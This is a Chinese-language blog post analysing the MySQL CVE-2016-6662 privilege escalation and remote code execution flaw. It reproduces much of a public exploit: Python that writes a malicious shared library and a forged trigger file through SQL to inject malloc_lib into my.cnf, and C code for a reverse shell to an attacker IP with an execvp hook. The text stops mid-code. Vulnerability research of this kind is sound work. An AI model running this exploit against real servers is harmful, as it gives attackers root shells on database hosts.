<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
    
  <meta name="description" content="Code security audit" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    MySQL CVE-2016-6662 漏洞利用与分析 |  FunFen Channel
  </title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/css/style.css">

  
<script src="/js/pace.min.js"></script>


  

  

</head>

</html>

<body>
  <div id="app">
    <main class="content">
      <section class="outer">
  <article id="post-cve-2016-6662" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  MySQL CVE-2016-6662 漏洞利用与分析
</h1>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/zh-CN/cve-2016-6662.html" class="article-date">
  <time datetime="2020-03-05T15:20:26.000Z" itemprop="datePublished">2020-03-05</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">漏洞研究</a>
  </div>

      
      
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">3.7k字</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">20分钟</span>
        </span>
    </span>
</div>

      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>不想跟着参考文章模仿一遍，就选择其他操作系统搭建另外漏洞版本的MySQL。</p>
<p>结果，踩了些坑，弄了好几天。</p>
<p>终于！！！试出来了~</p>
<p>先感谢下列文章的作者~</p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/84557" target="_blank" rel="noopener">【技术分享】CVE-2016-6662：Mysql远程代码执行/权限提升技术分析正式版（9/13 10:47更新） </a></p>
<p><a href="https://www.anquanke.com/post/id/84554" target="_blank" rel="noopener">【技术分享】CVE-2016-6662-MySQL ‘malloc_lib’变量重写命令执行分析 </a></p>
<p><a href="https://paper.seebug.org/46/" target="_blank" rel="noopener">MySQL远程代码执行／权限提升漏洞的分析与实践（CVE-2016-6662）</a></p>
<p><a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html" target="_blank" rel="noopener">MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662</a></p>
</blockquote>
<h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><ul>
<li>CVE：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6662" target="_blank" rel="noopener">CVE-2016-6662</a></li>
</ul>
<blockquote>
<p>Oracle MySQL through 5.5.52, 5.6.x through 5.6.33, and 5.7.x through  5.7.15; MariaDB before 5.5.51, 10.0.x before 10.0.27, and 10.1.x before  10.1.17; and Percona Server before 5.5.51-38.1, 5.6.x before  5.6.32-78.0, and 5.7.x before 5.7.14-7 allow local users to create arbitrary configurations and bypass certain protection mechanisms by  setting general_log_file to a my.cnf configuration. NOTE: this can be  leveraged to execute arbitrary code with root privileges by setting  malloc_lib. NOTE: the affected MySQL version information is from  Oracle’s October 2016 CPU. Oracle has not commented on third-party  claims that the issue was silently patched in MySQL 5.5.52, 5.6.33, and  5.7.15.</p>
</blockquote>
<ul>
<li><p>设置<code>general_log_file</code>，将<code>malloc_lib</code>参数值配置写入<code>my.cnf</code>，可以远程执行代码。</p>
</li>
<li><p>影响范围：5.5.x&lt;=5.5.51、5.6.x&lt;=5.6.32 、5.7.x&lt;=5.7.14 </p>
</li>
<li><p>总结：服务端的问题，涉及权限不当。</p>
</li>
</ul>
<a id="more"></a>



<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>MySQL 版本：5.6.32</p>
<p>操作系统：CentOS 7.6</p>
<ol>
<li><p>MySQL 5.6.32 默认安装</p>
<ul>
<li><p>安装运行 MySQL 5.6.32；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mysql-5.6]# ls -l</span><br><span class="line">total 80104</span><br><span class="line">-rw-r--r--. 1 fen fen 20283448 Mar  2 23:07 MySQL-client-5.6.32-1.el7.x86_64.rpm</span><br><span class="line">-rw-r--r--. 1 fen fen 61738028 Mar  2 23:43 MySQL-server-5.6.32-1.el7.x86_64.rpm</span><br><span class="line">[root@localhost mysql-5.6]# yum install MySQL-*</span><br><span class="line">[root@localhost mysql-5.6]# service mysql start</span><br><span class="line">Starting MySQL. SUCCESS!</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看<code>mysql</code>相关进程，发现<code>mysqld_safe</code>进程，居然是<code>root</code>用户启动的；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ps aux | grep mysqld | grep -v grep</span><br><span class="line">root       3633  0.0  0.0  11692    52 ?        S    16:44   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --pid-file=/var/lib/mysql/localhost.localdomain.pid</span><br><span class="line">mysql      3736  0.1  0.0 985344   448 ?        Sl   16:44   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --user=mysql --log-error=/var/lib/mysql/localhost.localdomain.err --pid-file=/var/lib/mysql/localhost.localdomain.pid</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看<code>mysqld_safe</code>的用法，发现支持<code>--malloc-lib=LIB</code> 参数，可加载共享库；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# mysqld_safe --help</span><br><span class="line">Usage: /usr/bin/mysqld_safe [OPTIONS]</span><br><span class="line">  --no-defaults              Don't read the system defaults file</span><br><span class="line">  --defaults-file=FILE       Use the specified defaults file</span><br><span class="line">  --defaults-extra-file=FILE Also use defaults from the specified file</span><br><span class="line">  --ledir=DIRECTORY          Look for mysqld in the specified directory</span><br><span class="line">  --open-files-limit=LIMIT   Limit the number of open files</span><br><span class="line">  --core-file-size=LIMIT     Limit core files to the specified size</span><br><span class="line">  --timezone=TZ              Set the system timezone</span><br><span class="line">  --malloc-lib=LIB           Preload shared library LIB if available</span><br><span class="line">  --mysqld=FILE              Use the specified file as mysqld</span><br><span class="line">  --mysqld-version=VERSION   Use "mysqld-VERSION" as mysqld</span><br><span class="line">  --nice=NICE                Set the scheduling priority of mysqld</span><br><span class="line">  --plugin-dir=DIR           Plugins are under DIR or DIR/VERSION, if</span><br><span class="line">                             VERSION is given</span><br><span class="line">  --skip-kill-mysqld         Don't try to kill stray mysqld processes</span><br><span class="line">  --syslog                   Log messages to syslog with 'logger'</span><br><span class="line">  --skip-syslog              Log messages to error log (default)</span><br><span class="line">  --syslog-tag=TAG           Pass -t "mysqld-TAG" to 'logger'</span><br><span class="line"></span><br><span class="line">All other options are passed to the mysqld program.</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看<code>mysqld_safe</code>脚本里读取配置的部分；当前环境下，<code>$MY_BASEDIR_VERSION/my.cnf</code>与<code>$DATADIR/my.cnf</code>，只能读取一个；或者将<code>DATADIR</code>设为<code>$MY_BASEDIR_VERSION/data</code>，就会读取<code>$DATADIR/my.cnf</code>；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Try <span class="built_in">where</span> the binary installs put it</span></span><br><span class="line">if test -d $MY_BASEDIR_VERSION/data/mysql</span><br><span class="line">then</span><br><span class="line">  DATADIR=$MY_BASEDIR_VERSION/data</span><br><span class="line">  if test -z "$defaults" -a -r "$DATADIR/my.cnf"</span><br><span class="line">  then</span><br><span class="line">    defaults="--defaults-extra-file=$DATADIR/my.cnf"</span><br><span class="line">  fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> Next try <span class="built_in">where</span> the <span class="built_in">source</span> installs put it</span></span><br><span class="line">elif test -d $MY_BASEDIR_VERSION/var/mysql</span><br><span class="line">then</span><br><span class="line">  DATADIR=$MY_BASEDIR_VERSION/var</span><br><span class="line"><span class="meta">#</span><span class="bash"> Or just give up and use our compiled-in default</span></span><br><span class="line">else</span><br><span class="line">  DATADIR=/var/lib/mysql</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if test -z "$MYSQL_HOME"</span><br><span class="line">then </span><br><span class="line">  if test -r "$MY_BASEDIR_VERSION/my.cnf" &amp;&amp; test -r "$DATADIR/my.cnf"</span><br><span class="line">  then</span><br><span class="line">    log_error "WARNING: Found two instances of my.cnf -</span><br><span class="line"><span class="meta">$</span><span class="bash">MY_BASEDIR_VERSION/my.cnf and</span></span><br><span class="line"><span class="meta">$</span><span class="bash">DATADIR/my.cnf</span></span><br><span class="line">IGNORING $DATADIR/my.cnf"</span><br><span class="line"></span><br><span class="line">    MYSQL_HOME=$MY_BASEDIR_VERSION</span><br><span class="line">  elif test -r "$DATADIR/my.cnf"</span><br><span class="line">  then</span><br><span class="line">    log_error "WARNING: Found $DATADIR/my.cnf</span><br><span class="line">The data directory is a deprecated location for my.cnf, please move it to</span><br><span class="line"><span class="meta">$</span><span class="bash">MY_BASEDIR_VERSION/my.cnf<span class="string">"</span></span></span><br><span class="line">    MYSQL_HOME=$DATADIR</span><br><span class="line">  else</span><br><span class="line">    MYSQL_HOME=$MY_BASEDIR_VERSION</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line">export MYSQL_HOME</span><br></pre></td></tr></table></figure>
</li>
<li><p>搜索<code>my.cnf</code>配置文件，当前情况下，就算在<code>$DATADIR/my.cnf</code>写入配置，也是不生效的；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# find / -name my.cnf</span><br><span class="line">/usr/my.cnf</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置<code>general_log_file</code>，这个操作是需要<code>SUPER</code>权限；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global general_log_file=<span class="string">'/var/lib/mysql/my.log'</span>;</span></span><br><span class="line">ERROR 1227 (42000): Access denied; you need (at least one of) the SUPER privilege(s) for this operation</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>攻击脚本<code>0ldSQL_MySQL_RCE_exploit.py</code> </p>
<ul>
<li><p>共享库编译与写入指定目录，所以要求攻击者获得的数据库账号权限要有<code>FILE</code>；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># where will the library to be preloaded reside? /tmp might get emptied on reboot</span></span><br><span class="line"><span class="comment"># /var/lib/mysql is safer option (and mysql can definitely write in there ;)</span></span><br><span class="line">malloc_lib_path=<span class="string">'/var/lib/mysql/mysql_hookandroot_lib.so'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 mysql_hookandroot_lib.so</span></span><br><span class="line"><span class="comment"># Compile mysql_hookandroot_lib.so shared library that will eventually hook to the mysqld </span></span><br><span class="line"><span class="comment"># process execution and run our code (Remote Root Shell)</span></span><br><span class="line"><span class="comment"># Remember to match the architecture of the target (not your machine!) otherwise the library</span></span><br><span class="line"><span class="comment"># will not load properly on the target.</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"Compiling mysql_hookandroot_lib.so"</span>)</span><br><span class="line">cmd = <span class="string">"gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl"</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">(result, error) = process.communicate()</span><br><span class="line">rc = process.wait() </span><br><span class="line"><span class="keyword">if</span> rc != <span class="number">0</span>:</span><br><span class="line">    errmsg(<span class="string">"Failed to compile mysql_hookandroot_lib.so: %s"</span> % cmd)</span><br><span class="line">    <span class="keyword">print</span> error </span><br><span class="line">    shutdown(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 mysql_hookandroot_lib.so 文件</span></span><br><span class="line"><span class="comment"># Load mysql_hookandroot_lib.so library and encode it into HEX</span></span><br><span class="line">info(<span class="string">"Converting mysql_hookandroot_lib.so into HEX"</span>)</span><br><span class="line">hookandrootlib_path = <span class="string">'./mysql_hookandroot_lib.so'</span></span><br><span class="line"><span class="keyword">with</span> open(hookandrootlib_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出 mysql_hookandroot_lib.so 文件     </span></span><br><span class="line"><span class="comment"># Save library into a trigger file</span></span><br><span class="line">info(<span class="string">"Dumping shared library into %s file on the target"</span> % malloc_lib_path)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor = dbconn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"""SELECT unhex("%s") INTO DUMPFILE '%s' """</span> % (hookandrootlib_hex, malloc_lib_path) )</span><br><span class="line"><span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">    errmsg(<span class="string">"Something went wrong: &#123;&#125;"</span>.format(err))</span><br><span class="line">    shutdown(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建trigger，绕过<code>SUPER</code>权限，设置<code>general_log_file</code>；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Trigger payload that will elevate user privileges and sucessfully execute SET GLOBAL GENERAL_LOG </span></span><br><span class="line"><span class="comment"># in spite of the lack of SUPER/admin privileges (attacker only needs SELECT/FILE privileges).</span></span><br><span class="line"><span class="comment"># Decoded payload (paths may differ) will look similar to:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">DELIMITER //</span></span><br><span class="line"><span class="string">CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf</span></span><br><span class="line"><span class="string">AFTER INSERT</span></span><br><span class="line"><span class="string">   ON `poctable` FOR EACH ROW</span></span><br><span class="line"><span class="string">BEGIN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   DECLARE void varchar(550);</span></span><br><span class="line"><span class="string">   set global general_log_file='/var/lib/mysql/my.cnf';</span></span><br><span class="line"><span class="string">   set global general_log = on;</span></span><br><span class="line"><span class="string">   select "</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 0ldSQL_MySQL_RCE_exploit got here :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[mysqld]</span></span><br><span class="line"><span class="string">malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[abyss]</span></span><br><span class="line"><span class="string">" INTO void;   </span></span><br><span class="line"><span class="string">   set global general_log = off;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">END; //</span></span><br><span class="line"><span class="string">DELIMITER ;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">trigger_payload=<span class="string">"""TYPE=TRIGGERS</span></span><br><span class="line"><span class="string">triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'</span></span><br><span class="line"><span class="string">sql_modes=0</span></span><br><span class="line"><span class="string">definers='root@localhost'</span></span><br><span class="line"><span class="string">client_cs_names='utf8'</span></span><br><span class="line"><span class="string">connection_cl_names='utf8_general_ci'</span></span><br><span class="line"><span class="string">db_cl_names='latin1_swedish_ci'</span></span><br><span class="line"><span class="string">"""</span> % (args.TARGET_MYCNF, malloc_lib_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert trigger into HEX to pass it to unhex() SQL function</span></span><br><span class="line">trigger_payload_hex = <span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> trigger_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save trigger into a trigger file</span></span><br><span class="line">TRG_path=<span class="string">"/var/lib/mysql/%s/poctable.TRG"</span> % args.TARGET_DB</span><br><span class="line">info(<span class="string">"Saving trigger payload into %s"</span> % (TRG_path))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor = dbconn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"""SELECT unhex("%s") INTO DUMPFILE '%s' """</span> % (trigger_payload_hex, TRG_path) )</span><br><span class="line"><span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">    errmsg(<span class="string">"Something went wrong: &#123;&#125;"</span>.format(err))</span><br><span class="line">    shutdown(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Creating table poctable so that /var/lib/mysql/pocdb/poctable.TRG trigger gets loaded by the server</span></span><br><span class="line">info(<span class="string">"Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor = dbconn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'"</span>  )</span><br><span class="line"><span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">    errmsg(<span class="string">"Something went wrong: &#123;&#125;"</span>.format(err))</span><br><span class="line">    shutdown(<span class="number">6</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># Finally, execute the trigger's payload by inserting anything into `poctable`. </span></span><br><span class="line"><span class="comment"># The payload will write to the mysql config file at this point.</span></span><br><span class="line">info(<span class="string">"Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config %s"</span> % args.TARGET_MYCNF )</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor = dbconn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"INSERT INTO `poctable` VALUES('execute the trigger!');"</span> )</span><br><span class="line"><span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">    errmsg(<span class="string">"Something went wrong: &#123;&#125;"</span>.format(err))</span><br><span class="line">    shutdown(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>恶意代码<code>mysql_hookandroot_lib.c</code></p>
<ul>
<li><p>反弹shell；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ATTACKERS_IP <span class="meta-string">"127.0.0.1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELL_PORT 6033</span></span><br><span class="line"><span class="keyword">char</span>* env_list[] = &#123; <span class="string">"HOME=/root"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fork &amp; send a bash shell to the attacker before starting mysqld</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i; <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="comment">//socklen_t socklen;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>;</span></span><br><span class="line">    srv_addr.sin_family = AF_INET; </span><br><span class="line">    srv_addr.sin_port = htons( SHELL_PORT ); <span class="comment">// connect-back port</span></span><br><span class="line">    srv_addr.sin_addr.s_addr = inet_addr(ATTACKERS_IP); <span class="comment">// connect-back ip </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// create new TCP socket &amp;&amp; connect</span></span><br><span class="line">    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );</span><br><span class="line">    <span class="built_in">connect</span>(sockfd, (struct sockaddr *)&amp;srv_addr, <span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; i++) dup2(sockfd, i);</span><br><span class="line">    execle( <span class="string">"/bin/bash"</span>, <span class="string">"/bin/bash"</span>, <span class="string">"-i"</span>, <span class="literal">NULL</span>, env_list );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>清理配置文件<code>my.cnf</code>里多余内容，使<code>mysqld</code>能够正常运行；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> cleanup injected data from the target config before it is read by mysqld</span></span><br><span class="line"><span class="comment"> in order to ensure clean startup of the service</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The injection (if done via logging) will start with a line like this:</span></span><br><span class="line"><span class="comment"> /usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 找到 /usr/sbin/mysqld, Version 这一行，然后把这一行往后的文件内容删掉</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">config_cleanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE *conf;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">2000</span>];</span><br><span class="line">    <span class="keyword">long</span> cut_offset=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    conf = fopen(INJECTED_CONF, <span class="string">"r+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!conf) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(conf)) &#123;</span><br><span class="line">       fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), conf);</span><br><span class="line">       <span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="built_in">buffer</span>,<span class="string">"/usr/sbin/mysqld, Version"</span>)) &#123;</span><br><span class="line">	  cut_offset = (ftell(conf) - <span class="built_in">strlen</span>(<span class="built_in">buffer</span>));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cut_offset&gt;<span class="number">0</span>) ftruncate(fileno(conf), cut_offset);</span><br><span class="line">    fclose(conf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>hook <code>execvp()</code>，调用<code>config_cleanup()</code>和<code>reverse_shell()</code>；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// execvp() hook</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">ssize_t</span> <span class="params">(*<span class="keyword">execvp_func_t</span>)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__file, <span class="keyword">char</span> *<span class="keyword">const</span> __argv[])</span></span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">execvp_func_t</span> old_execvp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span 